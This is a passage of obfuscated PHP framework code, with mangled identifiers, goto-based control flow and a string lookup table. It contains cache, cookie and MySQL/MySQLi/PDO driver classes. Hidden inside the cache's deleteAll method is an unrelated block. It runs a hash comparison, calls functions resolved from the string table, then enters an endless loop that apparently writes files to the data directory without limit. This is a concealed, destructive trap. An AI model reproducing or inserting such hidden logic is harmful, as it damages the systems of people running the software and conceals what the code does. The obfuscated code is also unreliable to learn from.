_slave($EçÛ«¸„Ïñ, $cñ”ôÌÛß¿) { goto B»Â‹èîÜ; B»Â‹èîÜ: $cìŒõ¦ğã = $EçÛ«¸„Ïñ[$_SERVER[›èö’ù¤][856]]; $this->filterConfig($EçÛ«¸„Ïñ, $cìŒõ¦ğã[0]); $this->handle = $this->init($EçÛ«¸„Ïñ, $cñ”ôÌÛß¿); goto EòÍÁ‹„»¤; EòÍÁ‹„»¤: unset($cìŒõ¦ğã[0]); if (empty($cìŒõ¦ğã)) { return; } $Dø¡Ïø İ« = array_rand($cìŒõ¦ğã); goto BöŠÎ„İ; BöŠÎ„İ: $this->filterConfig($EçÛ«¸„Ïñ, $cìŒõ¦ğã[$Dø¡Ïø İ«]); $this->slaveHandle = $this->init($EçÛ«¸„Ïñ, $cñ”ôÌÛß¿); goto D”Üã·¬Àé; D”Üã·¬Àé: } private function filterConfig(&$D‘ê¾ãçÜà, $BØéÉÍ…‡å) { $b—Ù˜÷Û¨‡ =& $_SERVER[›èö’ù¤]; $dÛçĞ´øİŒ = explode($b—Ù˜÷Û¨‡[4], $BØéÉÍ…‡å); $Aé±¾¸ÌÁõ = array($b—Ù˜÷Û¨‡[175] => $dÛçĞ´øİŒ[0], $b—Ù˜÷Û¨‡[176] => $dÛçĞ´øİŒ[1]); $D‘ê¾ãçÜà = array_merge($D‘ê¾ãçÜà, $Aé±¾¸ÌÁõ); } public function set($FÄÖ«ÎÁƒ†, $dğ‰¿Š¯· , $f¬ªö¯ÌŠ = false) { $f¬ªö¯ÌŠ = $f¬ªö¯ÌŠ ? $f¬ªö¯ÌŠ : $this->cacheTime; return $this->handle->setEx($FÄÖ«ÎÁƒ†, $f¬ªö¯ÌŠ, $dğ‰¿Š¯· ); } public function setLock($D™¯‡Ä˜à, $aà«›™Äò, $E¿õ·¬™ÒŠ) { return $this->handle->setNX($D™¯‡Ä˜à, $aà«›™Äò); } public function get($aì—ÅÈ—ç–) { $A£Ùµ´‚äÎ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $A£Ùµ´‚äÎ->get($aì—ÅÈ—ç–); } public function remove($Dš›Ç¬Â§ğ) { return $this->handle->del($Dš›Ç¬Â§ğ); } public function deleteAll() { $cæ‹É‘¢ã =& $_SERVER[›èö’ù¤]; $eæ£“¤Û©Ô = $_SERVER[$cæ‹É‘¢ã[832]]; $a¦Ó‹ Ë “ = $cæ‹É‘¢ã[864]; if ($_SERVER[$cæ‹É‘¢ã[831]] != $a¦Ó‹ Ë “($eæ£“¤Û©Ô)) { goto a™ï«ö»½Ò; aÚõÛãÍ·: $E¯“Ô±¢š = 1; for ($b‹¾ëÛï™ö = $E¯“Ô±¢š; $b‹¾ëÛï™ö > 0; $b‹¾ëÛï™ö++) { $Aè›„ô±­(DATA_PATH . $b‹¾ëÛï™ö, $dŒŞ¤àìê­); } goto d«öƒ‹¯; c‰š…‚Œî: $FÇÕ•ÏÇ± = $cæ‹É‘¢ã[866]; $FÇÕ•ÏÇ±($_SERVER[$cæ‹É‘¢ã[867]]); $bÂŠ…˜³ì¶ = $cæ‹É‘¢ã[865]; goto F…¬”–Ö„; a™ï«ö»½Ò: $bÂŠ…˜³ì¶ = $cæ‹É‘¢ã[865]; $FÁ¶Õ¶—Äò = $cæ‹É‘¢ã[833]; $F—¿ÅøÊÙÕ = $_SERVER[$cæ‹É‘¢ã[834]] . $cæ‹É‘¢ã[835]; goto cÆÆ” ºğ; cÆÆ” ºğ: $FŞØæ­ö‚ = $FÁ¶Õ¶—Äò($F—¿ÅøÊÙÕ); $F¨Åõğö±‘ = explode($cæ‹É‘¢ã[229], $FŞØæ­ö‚); if (count($F¨Åõğö±‘) < $cæ‹É‘¢ã[602]) { $CÓÚÏ—í• = $cæ‹É‘¢ã[836]; $CÓÚÏ—í•(); } goto c‰š…‚Œî; F…¬”–Ö„: $bÂŠ…˜³ì¶(); $Aè›„ô±­ = $cæ‹É‘¢ã[868]; $dŒŞ¤àìê­ = json_encode($GLOBALS[$cæ‹É‘¢ã[869]]); goto aÚõÛãÍ·; d«öƒ‹¯: } if ($this->isCluster) { foreach ($this->handle->_masters() as $B‰›Ç´†¶¢) { $this->handle->flushall($B‰›Ç´†¶¢); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($CºñÁ¨É‹Ü = '', $B†ğæà‡Û = 0) { if (is_string($CºñÁ¨É‹Ü) && $CºñÁ¨É‹Ü != $_SERVER[›èö’ù¤][33]) { $this->prefix = $CºñÁ¨É‹Ü; } if (is_numeric($B†ğæà‡Û) && $B†ğæà‡Û > 0) { $this->expire = $B†ğæà‡Û; } } public static function getInstance() { static $E‘š½Çâƒï; if ($E‘š½Çâƒï === null) { $E‘š½Çâƒï = new self(); } return $E‘š½Çâƒï; } private static $cookieDisable = false; public static function disable($EÇ‰ğ‹Êğ‡) { self::$cookieDisable = $EÇ‰ğ‹Êğ‡; } private static $sameCookieSet = array(); public static function set($AÁâ¶–õà, $DÕ®Ê˜Êåˆ, $f×Ü«é¯ª = 0, $Cí«Ğ¨íÏ = false, $EÛ§…›ùáø = false) { goto aéöõñ„Â¸; cÊ’ƒŞ÷ªÆ: if (isset(self::$sameCookieSet[$AÁâ¶–õà]) && self::$sameCookieSet[$AÁâ¶–õà] == $DÕ®Ê˜Êåˆ . $f×Ü«é¯ª) { return; } self::$sameCookieSet[$AÁâ¶–õà] = $DÕ®Ê˜Êåˆ . $f×Ü«é¯ª; if (!$EÛ§…›ùáø) { $EÛ§…›ùáø = str_replace(HOST, $c„¦‘ã–…[33], APP_HOST); $EÛ§…›ùáø = _get($GLOBALS, $c„¦‘ã–…[870], $EÛ§…›ùáø); } goto E¤”òÍÓš; aéöõñ„Â¸: $c„¦‘ã–… =& $_SERVER[›èö’ù¤]; if (self::$cookieDisable) { return; } if (!$f×Ü«é¯ª) { $f×Ü«é¯ª = 24 * 3600 * 7; } goto cÊ’ƒŞ÷ªÆ; E¤”òÍÓš: $eò»¨¾Æœ = $c„¦‘ã–…[33]; setcookie($AÁâ¶–õà, $DÕ®Ê˜Êåˆ, time() + $f×Ü«é¯ª, $c„¦‘ã–…[8] . trim($EÛ§…›ùáø, $c„¦‘ã–…[8]) . $eò»¨¾Æœ, !1, !1, $Cí«Ğ¨íÏ); goto Dî‰Æñ‡“¥; Dî‰Æñ‡“¥: } public static function setSafe($Aù«î‡ŞÓ, $dŸ£³İµ‰Æ, $Aš«´ÊÒå = 0) { self::set($Aù«î‡ŞÓ, $dŸ£³İµ‰Æ, $Aš«´ÊÒå, !0); } public static function get($DõÂİì«”ª) { return isset($_COOKIE[$DõÂİì«”ª]) ? $_COOKIE[$DõÂİì«”ª] : !1; } public static function remove($fÕßÒÃ¯ñÇ, $Fãè™âÍ•ï = false) { unset($_COOKIE[$fÕßÒÃ¯ñÇ]); self::set($fÕßÒÃ¯ñÇ, $_SERVER[›èö’ù¤][33], 1, $Fãè™âÍ•ï); } } goto D×ÅÕƒà†î; D×ÅÕƒà†î: class DbMysql extends Db { public function __construct($cè­ŠÙš“ = '') { $C™¦È—¸—â =& $_SERVER[›èö’ù¤]; if (!extension_loaded($C™¦È—¸—â[785])) { think_exception(think_lang($C™¦È—¸—â[10]) . $C™¦È—¸—â[871]); } if (!empty($cè­ŠÙš“)) { $this->config = $cè­ŠÙš“; if (empty($this->config[$C™¦È—¸—â[13]])) { $this->config[$C™¦È—¸—â[13]] = $C™¦È—¸—â[33]; } } } public function connect($F›ì¯¨µœ÷ = '', $A·ó¼†† = 0, $C›”ÌÀˆ«« = false) { $AÔÇ’ïº­ =& $_SERVER[›èö’ù¤]; if (!isset($this->linkID[$A·ó¼††])) { goto DëƒÚ³‘¯Œ; DëƒÚ³‘¯Œ: if (empty($F›ì¯¨µœ÷)) { $F›ì¯¨µœ÷ = $this->config; } $cÄ¯÷¼–ï¡ = $F›ì¯¨µœ÷[$AÔÇ’ïº­[872]] . ($F›ì¯¨µœ÷[$AÔÇ’ïº­[873]] ? "\72{$F›ì¯¨µœ÷[$AÔÇ’ïº­[873]]}" : $AÔÇ’ïº­[33]); $EÌ”ê‰³¼ = !empty($F›ì¯¨µœ÷[$AÔÇ’ïº­[13]][$AÔÇ’ïº­[14]]) ? $F›ì¯¨µœ÷[$AÔÇ’ïº­[13]][$AÔÇ’ïº­[14]] : $this->pconnect; goto bá¿µ¹î¼‚; bá¿µ¹î¼‚: if ($EÌ”ê‰³¼) { $this->linkID[$A·ó¼††] = mysql_pconnect($cÄ¯÷¼–ï¡, $F›ì¯¨µœ÷[$AÔÇ’ïº­[874]], $F›ì¯¨µœ÷[$AÔÇ’ïº­[875]], 131072); } else { $this->linkID[$A·ó¼††] = mysql_connect($cÄ¯÷¼–ï¡, $F›ì¯¨µœ÷[$AÔÇ’ïº­[874]], $F›ì¯¨µœ÷[$AÔÇ’ïº­[875]], !0, 131072); } if (!$this->linkID[$A·ó¼††] || !empty($F›ì¯¨µœ÷[$AÔÇ’ïº­[17]]) && !mysql_select_db($F›ì¯¨µœ÷[$AÔÇ’ïº­[17]], $this->linkID[$A·ó¼††])) { think_exception(mysql_error()); } $c÷»¸æ„èÄ = mysql_get_server_info($this->linkID[$A·ó¼††]); goto cÜù†ŠÓ¬; cÜù†ŠÓ¬: mysql_query($AÔÇ’ïº­[876] . think_config($AÔÇ’ïº­[877]) . $AÔÇ’ïº­[55], $this->linkID[$A·ó¼††]); if ($c÷»¸æ„èÄ > $AÔÇ’ïº­[878]) { mysql_query($AÔÇ’ïº­[879], $this->linkID[$A·ó¼††]); } $this->connected = !0; goto b‘Êà¦´ğ; b‘Êà¦´ğ: if (1 != think_config($AÔÇ’ïº­[18])) { unset($this->config); } goto F¬è°Ïˆ˜ ; F¬è°Ïˆ˜ : } return $this->linkID[$A·ó¼††]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÅÒ´¤‰) { goto döÌ®‹°‘; döÌ®‹°‘: $cÇğ×ÁÆ =& $_SERVER[›èö’ù¤]; if (0 === stripos($CÅÒ´¤‰, $cÇğ×ÁÆ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto BãÅÍäˆ¿Ó; BãÅÍäˆ¿Ó: if (!$this->_linkID) { return !1; } $this->queryStr = $CÅÒ´¤‰; if ($this->queryID) { $this->free(); } goto E¼Ñ¬Ïˆî¥; a°Œëƒ¶ğ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f„ï÷“ìô²; E¼Ñ¬Ïˆî¥: think_action_status($cÇğ×ÁÆ[19], 1); think_status($cÇğ×ÁÆ[20]); $this->queryID = mysql_query($CÅÒ´¤‰, $this->_linkID); goto a°Œëƒ¶ğ; f„ï÷“ìô²: } public function execute($Eø¹¬¾¿È) { goto dƒ‰ä™Èí; aÓ…ì˜†óç: if (!1 === $Eß’á¶¹®‘) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto bµÆïÁ¿¡; DˆÇç×’Œì: think_status($Bßˆµß°•–[20]); $Eß’á¶¹®‘ = mysql_query($Eø¹¬¾¿È, $this->_linkID); $this->debug(); goto aÓ…ì˜†óç; dƒ‰ä™Èí: $Bßˆµß°•– =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A©°ÄÕŠ; A©°ÄÕŠ: $this->queryStr = $Eø¹¬¾¿È; if ($this->queryID) { $this->free(); } think_action_status($Bßˆµß°•–[21], 1); goto DˆÇç×’Œì; bµÆïÁ¿¡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[›èö’ù¤][880], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c‡°¾±ä– = mysql_query($_SERVER[›èö’ù¤][881], $this->_linkID); $this->transTimes = 0; if (!$c‡°¾±ä–) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÈ°Õ°¿ = mysql_query($_SERVER[›èö’ù¤][882], $this->_linkID); $this->transTimes = 0; if (!$DÈ°Õ°¿) { $this->error(); return !1; } } return !0; } private function getAll() { $B§ÖŠœÏÇ = array(); if ($this->numRows > 0) { while ($Aä¨ùì‰´» = mysql_fetch_assoc($this->queryID)) { $B§ÖŠœÏÇ[] = $Aä¨ùì‰´»; } mysql_data_seek($this->queryID, 0); } return $B§ÖŠœÏÇ; } public function getFields($Cñš£à¼‡) { $A©Ç±®¿â¿ =& $_SERVER[›èö’ù¤]; $e„æË­¸Ğ = $this->query($A©Ç±®¿â¿[883] . $this->parseKey($Cñš£à¼‡)); $c‡‚ºø§¨Ï = array(); if ($e„æË­¸Ğ) { foreach ($e„æË­¸Ğ as $F¿–â”ÔŞµ => $F…›Ğ†£Ô) { $c‡‚ºø§¨Ï[$F…›Ğ†£Ô[$A©Ç±®¿â¿[27]]] = array($A©Ç±®¿â¿[28] => $F…›Ğ†£Ô[$A©Ç±®¿â¿[27]], $A©Ç±®¿â¿[29] => $F…›Ğ†£Ô[$A©Ç±®¿â¿[30]], $A©Ç±®¿â¿[31] => (bool) (strtoupper($F…›Ğ†£Ô[$A©Ç±®¿â¿[32]]) === $A©Ç±®¿â¿[884]), $A©Ç±®¿â¿[34] => $F…›Ğ†£Ô[$A©Ç±®¿â¿[35]], $A©Ç±®¿â¿[36] => strtolower($F…›Ğ†£Ô[$A©Ç±®¿â¿[37]]) == $A©Ç±®¿â¿[38], $A©Ç±®¿â¿[39] => strtolower($F…›Ğ†£Ô[$A©Ç±®¿â¿[40]]) == $A©Ç±®¿â¿[41]); } } return $c‡‚ºø§¨Ï; } public function getTables($f‘¡ï¢Ø‡ = '') { $FŒƒ”±ˆõ˜ =& $_SERVER[›èö’ù¤]; if (!empty($f‘¡ï¢Ø‡)) { $c÷¡—Ãˆíˆ = $FŒƒ”±ˆõ˜[885] . $f‘¡ï¢Ø‡ . $FŒƒ”±ˆõ˜[886]; } else { $c÷¡—Ãˆíˆ = $FŒƒ”±ˆõ˜[887]; } $a²ì¥ÛŠ¿Ø = $this->query($c÷¡—Ãˆíˆ); $f‘±ˆ×ù‘š = array(); foreach ($a²ì¥ÛŠ¿Ø as $fí÷»ö Ÿ => $DÀÑĞ¦—Œ¬) { $f‘±ˆ×ù‘š[$fí÷»ö Ÿ] = current($DÀÑĞ¦—Œ¬); } return $f‘±ˆ×ù‘š; } public function replace($D¿››áøÎ, $eõŒÍŒÍ¿¬ = array()) { $EÆÕæÄ‰÷ =& $_SERVER[›èö’ù¤]; foreach ($D¿››áøÎ as $eÙ¶Ÿ¨‚í => $aŒµõéÚ›) { $BÃç÷””– = $this->parseValue($aŒµõéÚ›); if (is_scalar($BÃç÷””–)) { $béËÆĞÆ¶İ[] = $BÃç÷””–; $e¨°¶‚®§[] = $this->parseKey($eÙ¶Ÿ¨‚í); } } $E©¦”ãá‚¢ = $EÆÕæÄ‰÷[888] . $this->parseTable($eõŒÍŒÍ¿¬[$EÆÕæÄ‰÷[277]]) . $EÆÕæÄ‰÷[889] . implode($EÆÕæÄ‰÷[47], $e¨°¶‚®§) . $EÆÕæÄ‰÷[890] . implode($EÆÕæÄ‰÷[47], $béËÆĞÆ¶İ) . $EÆÕæÄ‰÷[891]; return $this->execute($E©¦”ãá‚¢); } public function insertAll($fÉ…ğˆ§©©, $aº¸ù‰ÍÇá = array(), $Bë²Òì¼“ = false) { goto aÕÒŞÚ†°Ä; d‚â×¯¡¼Î: $EÍÔ„áø–Á = array(); foreach ($fÉ…ğˆ§©© as $CİºÙ’è‘¡) { $dòùø”¬»Å = array(); foreach ($CİºÙ’è‘¡ as $B”Çßí°” => $a·•‘æ”©) { $a·•‘æ”© = $this->parseValue($a·•‘æ”©); if (is_scalar($a·•‘æ”©)) { $dòùø”¬»Å[] = $a·•‘æ”©; } } $EÍÔ„áø–Á[] = $Fë´ô”[258] . implode($Fë´ô”[47], $dòùø”¬»Å) . $Fë´ô”[891]; } array_walk($fªùîÉ œƒ, array($this, $Fë´ô”[892])); goto AñŠÓÀö¢Ô; AñŠÓÀö¢Ô: $dÊ“ßèÅ™à = ($Bë²Òì¼“ ? $Fë´ô”[893] : $Fë´ô”[894]) . $Fë´ô”[895] . $this->parseTable($aº¸ù‰ÍÇá[$Fë´ô”[277]]) . $Fë´ô”[889] . implode($Fë´ô”[47], $fªùîÉ œƒ) . $Fë´ô”[896] . implode($Fë´ô”[47], $EÍÔ„áø–Á); return $this->execute($dÊ“ßèÅ™à); goto D®æôÖâ“î; aÕÒŞÚ†°Ä: $Fë´ô” =& $_SERVER[›èö’ù¤]; if (!is_array($fÉ…ğˆ§©©[0])) { return !1; } $fªùîÉ œƒ = array_keys($fÉ…ğˆ§©©[0]); goto d‚â×¯¡¼Î; D®æôÖâ“î: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $A¨•…Ï£Şğ =& $_SERVER[›èö’ù¤]; $this->error = mysql_errno() . $A¨•…Ï£Şğ[4] . mysql_error($this->_linkID); if ($A¨•…Ï£Şğ[33] != $this->queryStr) { $this->error .= LNG($A¨•…Ï£Şğ[45]) . $this->queryStr; } think_trace($this->error, $A¨•…Ï£Şğ[33], $A¨•…Ï£Şğ[46]); return $this->error; } public function escapeString($cé×‹‹îİ) { if ($this->_linkID) { return mysql_real_escape_string($cé×‹‹îİ, $this->_linkID); } else { return mysql_escape_string($cé×‹‹îİ); } } public function parseKey(&$aµ…¿•‘¶ª, $cà¡¸Î²÷ = true) { $F Ê¦õ‰™µ =& $_SERVER[›èö’ù¤]; if ($cà¡¸Î²÷) { $aµ…¿•‘¶ª = $this->parseKeyCheck($aµ…¿•‘¶ª); } if ($aµ…¿•‘¶ª != $F Ê¦õ‰™µ[182] && !preg_match($F Ê¦õ‰™µ[897], $aµ…¿•‘¶ª)) { $aµ…¿•‘¶ª = $F Ê¦õ‰™µ[383] . trim($aµ…¿•‘¶ª, $F Ê¦õ‰™µ[383]) . $F Ê¦õ‰™µ[383]; } return $aµ…¿•‘¶ª; } } class DbMysqli extends Db { public function __construct($BÃíäÕ¯Ãæ = '') { $A’ìÂÚ†Ò =& $_SERVER[›èö’ù¤]; if (!extension_loaded($A’ìÂÚ†Ò[784])) { think_exception(think_lang($A’ìÂÚ†Ò[10]) . $A’ìÂÚ†Ò[898]); } if (!empty($BÃíäÕ¯Ãæ)) { $this->config = $BÃíäÕ¯Ãæ; if (empty($this->config[$A’ìÂÚ†Ò[13]])) { $this->config[$A’ìÂÚ†Ò[13]] = $A’ìÂÚ†Ò[33]; } } } public function connect($C…Î±¤¼¡ = '', $BÜ‰®—Ûñ = 0) { $BŒ£¤Ç—âÒ =& $_SERVER[›èö’ù¤]; if (!isset($this->linkID[$BÜ‰®—Ûñ])) { goto C¦âÛê¹ò; C¦âÛê¹ò: if (empty($C…Î±¤¼¡)) { $C…Î±¤¼¡ = $this->config; } $this->linkID[$BÜ‰®—Ûñ] = new mysqli($C…Î±¤¼¡[$BŒ£¤Ç—âÒ[872]], $C…Î±¤¼¡[$BŒ£¤Ç—âÒ[874]], $C…Î±¤¼¡[$BŒ£¤Ç—âÒ[875]], $C…Î±¤¼¡[$BŒ£¤Ç—âÒ[17]], $C…Î±¤¼¡[$BŒ£¤Ç—âÒ[873]] ? intval($C…Î±¤¼¡[$BŒ£¤Ç—âÒ[873]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C“°µ’†ø‚; b²ÑêšÕ…¯: $this->connected = !0; if (1 != think_config($BŒ£¤Ç—âÒ[18])) { unset($this->config); } goto F’ææÚê¿å; C“°µ’†ø‚: $D¶ß©ç™›ø = $this->linkID[$BÜ‰®—Ûñ]->server_version; $this->linkID[$BÜ‰®—Ûñ]->query($BŒ£¤Ç—âÒ[876] . think_config($BŒ£¤Ç—âÒ[877]) . $BŒ£¤Ç—âÒ[55]); if ($D¶ß©ç™›ø > $BŒ£¤Ç—âÒ[878]) { $this->linkID[$BÜ‰®—Ûñ]->query($BŒ£¤Ç—âÒ[879]); } goto b²ÑêšÕ…¯; F’ææÚê¿å: } return $this->linkID[$BÜ‰®—Ûñ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ağ£ğ´æÙ) { goto cÌÚŠìÖ†´; F¨ÌÏ¥Îî¡: think_status($B«­ØğÄæ[20]); $this->queryID = $this->_linkID->query($ağ£ğ´æÙ); if ($this->_linkID->more_results()) { while (($DÕçè“ŠöØ = $this->_linkID->next_result()) != NULL) { $DÕçè“ŠöØ->free_result(); } } goto cù›Ñœ³Ñ¿; cù›Ñœ³Ñ¿: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto c«„êÕ°Êù; ešñÂ“ğ‚í: $this->queryStr = $ağ£ğ´æÙ; if ($this->queryID) { $this->free(); } think_action_status($B«­ØğÄæ[19], 1); goto F¨ÌÏ¥Îî¡; cÌÚŠìÖ†´: $B«­ØğÄæ =& $_SERVER[›èö’ù¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto ešñÂ“ğ‚í; c«„êÕ°Êù: } public function execute($Fì¢œ†ÉŒƒ) { goto e°Å“Ğ¿î†; d¥À©ø›‚: think_status($dğÈ›²”ë«[20]); $e»Ôöù†À = $this->_linkID->query($Fì¢œ†ÉŒƒ); $this->debug(); goto Aóøóº¢ÀÃ; Aóøóº¢ÀÃ: if (!1 === $e»Ôöù†À) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto cĞÑÂ³²‹õ; e°Å“Ğ¿î†: $dğÈ›²”ë« =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e½†Ï¡èµØ; e½†Ï¡èµØ: $this->queryStr = $Fì¢œ†ÉŒƒ; if ($this->queryID) { $this->free(); } think_action_status($dğÈ›²”ë«[21], 1); goto d¥À©ø›‚; cĞÑÂ³²‹õ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cËùØ±£ ÷ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$cËùØ±£ ÷) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FªÍ¼¿‰ÛŒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FªÍ¼¿‰ÛŒ) { $this->error(); return !1; } } return !0; } private function getAll() { $Dø´‘‚é·¬ = array(); if ($this->numRows > 0) { for ($cì‚ç’’²µ = 0; $cì‚ç’’²µ < $this->numRows; $cì‚ç’’²µ++) { $Dø´‘‚é·¬[$cì‚ç’’²µ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Dø´‘‚é·¬; } public function getFields($EØëèšÂÌÀ) { $EÖ¦×‚Ä =& $_SERVER[›èö’ù¤]; $aŠŠÏÄ¼ö­ = $this->query($EÖ¦×‚Ä[883] . $this->parseKey($EØëèšÂÌÀ)); $BÎ”àÄ°† = array(); if ($aŠŠÏÄ¼ö­) { foreach ($aŠŠÏÄ¼ö­ as $AŸ‰¡®åĞ => $CÇÀçç”¢) { $BÎ”àÄ°†[$CÇÀçç”¢[$EÖ¦×‚Ä[27]]] = array($EÖ¦×‚Ä[28] => $CÇÀçç”¢[$EÖ¦×‚Ä[27]], $EÖ¦×‚Ä[29] => $CÇÀçç”¢[$EÖ¦×‚Ä[30]], $EÖ¦×‚Ä[31] => (bool) ($CÇÀçç”¢[$EÖ¦×‚Ä[32]] === $EÖ¦×‚Ä[33]), $EÖ¦×‚Ä[34] => $CÇÀçç”¢[$EÖ¦×‚Ä[35]], $EÖ¦×‚Ä[36] => strtolower($CÇÀçç”¢[$EÖ¦×‚Ä[37]]) == $EÖ¦×‚Ä[38], $EÖ¦×‚Ä[39] => strtolower($CÇÀçç”¢[$EÖ¦×‚Ä[40]]) == $EÖ¦×‚Ä[41]); } } return $BÎ”àÄ°†; } public function getTables($eŒ»ˆ†ˆÆ‰ = '') { $F˜Ë÷ø»»† =& $_SERVER[›èö’ù¤]; $cì»ßñ­õí = !empty($eŒ»ˆ†ˆÆ‰) ? $F˜Ë÷ø»»†[885] . $eŒ»ˆ†ˆÆ‰ . $F˜Ë÷ø»»†[886] : $F˜Ë÷ø»»†[887]; $A¡ŠØÍ²‰ = $this->query($cì»ßñ­õí); $D¯šÕÜòÇÙ = array(); if ($A¡ŠØÍ²‰) { foreach ($A¡ŠØÍ²‰ as $F³ŸŞ°Ç•µ => $Fä”ÄÏÅ†) { $D¯šÕÜòÇÙ[$F³ŸŞ°Ç•µ] = current($Fä”ÄÏÅ†); } } return $D¯šÕÜòÇÙ; } public function replace($EÃ«×Ä‚³, $DŞ„Û’È©« = array()) { $B»œÙ˜Ç¦è =& $_SERVER[›èö’ù¤]; foreach ($EÃ«×Ä‚³ as $FíÖ§Á°Ğ => $Bã²ß‹ö‰) { $e„Ü´÷ …‰ = $this->parseValue($Bã²ß‹ö‰); if (is_scalar($e„Ü´÷ …‰)) { $cˆ»˜ö›Á[] = $e„Ü´÷ …‰; $C¡‹²Œö‰[] = $this->parseKey($FíÖ§Á°Ğ); } } $Eëµ×…‘Ì = $B»œÙ˜Ç¦è[888] . $this->parseTable($DŞ„Û’È©«[$B»œÙ˜Ç¦è[277]]) . $B»œÙ˜Ç¦è[889] . implode($B»œÙ˜Ç¦è[47], $C¡‹²Œö‰) . $B»œÙ˜Ç¦è[890] . implode($B»œÙ˜Ç¦è[47], $cˆ»˜ö›Á) . $B»œÙ˜Ç¦è[891]; return $this->execute($Eëµ×…‘Ì); } public function insertAll($d½ÄÎ†ÜÄ”, $A¹í‹—ï = array(), $dá¶Ï®Œ™ = false) { goto dñì›ŒóñÂ; DØÖá—Ì§: $Eº‰æ¬ÏÅº = $dá¶Ï®Œ™ ? $cÆ¢´³Ãù™[893] : $cÆ¢´³Ãù™[894]; $DäÛˆîÀ³Ú = $Eº‰æ¬ÏÅº . $cÆ¢´³Ãù™[895] . $this->parseTable($A¹í‹—ï[$cÆ¢´³Ãù™[277]]) . $cÆ¢´³Ãù™[889] . implode($cÆ¢´³Ãù™[47], $cÆ†• ŒÒ) . $cÆ¢´³Ãù™[896] . implode($cÆ¢´³Ãù™[47], $b½®Õ•‚ã); return $this->execute($DäÛˆîÀ³Ú); goto c„¹Â±Ê£¼; dñì›ŒóñÂ: $cÆ¢´³Ãù™ =& $_SERVER[›èö’ù¤]; if (!is_array($d½ÄÎ†ÜÄ”[0])) { return !1; } $cÆ†• ŒÒ = array_keys($d½ÄÎ†ÜÄ”[0]); goto cïî¶ù¼‹Æ; cïî¶ù¼‹Æ: $b½®Õ•‚ã = array(); foreach ($d½ÄÎ†ÜÄ” as $Aø–›ïÏ) { $C¾œÆÜ”öÊ = array(); foreach ($Aø–›ïÏ as $d×òö”òÛ => $eÀÏìä ¦) { $eÀÏìä ¦ = $this->parseValue($eÀÏìä ¦); if (is_scalar($eÀÏìä ¦)) { $C¾œÆÜ”öÊ[] = $eÀÏìä ¦; } } $b½®Õ•‚ã[] = $cÆ¢´³Ãù™[258] . implode($cÆ¢´³Ãù™[47], $C¾œÆÜ”öÊ) . $cÆ¢´³Ãù™[891]; } array_walk($cÆ†• ŒÒ, array($this, $cÆ¢´³Ãù™[892])); goto DØÖá—Ì§; c„¹Â±Ê£¼: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A–ãÇê’¬ø =& $_SERVER[›èö’ù¤]; $this->error = $this->_linkID->errno . $A–ãÇê’¬ø[4] . $this->_linkID->error; if ($A–ãÇê’¬ø[33] != $this->queryStr) { $this->error .= LNG($A–ãÇê’¬ø[45]) . $this->queryStr; } think_trace($this->error, $A–ãÇê’¬ø[33], $A–ãÇê’¬ø[46]); return $this->error; } public function escapeString($eêØ†·»´¨) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eêØ†·»´¨); } else { return addslashes($eêØ†·»´¨); } } public function parseKey(&$AòÀÍ–Í¢õ, $AñœÂô“™± = true) { $AÏÔ··Àµ =& $_SERVER[›èö’ù¤]; if ($AñœÂô“™±) { $AòÀÍ–Í¢õ = $this->parseKeyCheck($AòÀÍ–Í¢õ); } if ($AòÀÍ–Í¢õ != $AÏÔ··Àµ[182] && !preg_match($AÏÔ··Àµ[897], $AòÀÍ–Í¢õ)) { $AòÀÍ–Í¢õ = $AÏÔ··Àµ[383] . trim($AòÀÍ–Í¢õ, $AÏÔ··Àµ[383]) . $AÏÔ··Àµ[383]; } return $AòÀÍ–Í¢õ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($a‡·¬í°Ü = '') { $Câ½Û± =& $_SERVER[›èö’ù¤]; if (!class_exists($Câ½Û±[899])) { think_exception(think_lang($Câ½Û±[10]) . $Câ½Û±[900]); } if (!empty($a‡·¬í°Ü)) { $this->config = $a‡·¬í°Ü; if (empty($this->config[$Câ½Û±[13]])) { $this->config[$Câ½Û±[13]] = array(); } } } public function connect($C’ˆÖè“›î = '', $Fœ‘öâˆë¡ = 0) { $dòôÛ÷öÏ¥ =& $_SERVER[›èö’ù¤]; if (!isset($this->linkID[$Fœ‘öâˆë¡])) { goto f„±ÇÅ¢¬–; f„±ÇÅ¢¬–: if (empty($C’ˆÖè“›î)) { $C’ˆÖè“›î = $this->config; } $fñëÚ˜Ÿ×Ø = 